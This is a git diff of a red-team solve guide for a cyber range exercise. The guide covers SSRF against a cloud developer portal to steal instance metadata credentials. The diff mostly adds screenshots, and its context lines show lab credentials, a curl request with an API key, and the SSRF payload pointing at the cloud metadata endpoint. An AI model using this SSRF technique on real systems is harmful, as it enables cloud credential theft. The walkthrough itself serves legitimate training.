@@ -1,4 +1,4 @@
-# Solve Guide — Red Team
+<img width="2011" height="878" alt="image" src="https://github.com/user-attachments/assets/e4764478-020f-4ef7-a1e4-09d4de9a56bc" /># Solve Guide — Red Team
 ## RNG-CLD-01 | M1 — cld-webapp | SSRF → Cloud Metadata Credential Theft
 **Technique:** T1552.005 — Cloud Instance Metadata API  
 **Difficulty:** ★★☆☆☆ | **Pivot In:** `cloud_api_key: pul-cloud-dev-aK8x2mP9!2024` (from Dev Zone M5 AWX output)
@@ -47,6 +47,7 @@ Password: CloudDev@PUL2024!
 curl -s -H "X-Cloud-API-Key: pul-cloud-dev-aK8x2mP9!2024" \
     http://193.0.3.155:8080/dashboard
 ```
+<img width="1883" height="1041" alt="image" src="https://github.com/user-attachments/assets/43a0c77d-91a4-4ba9-8e6c-c9d52b3dce53" />
 
 ---
 
@@ -70,6 +71,7 @@ The Cloud Developer Portal runs on a cloud instance with an attached IAM role. T
 # In URL Health Checker, submit:
 http://169.254.169.254/latest/meta-data/
 ```
+
 Expected output:
 ```
 ami-id
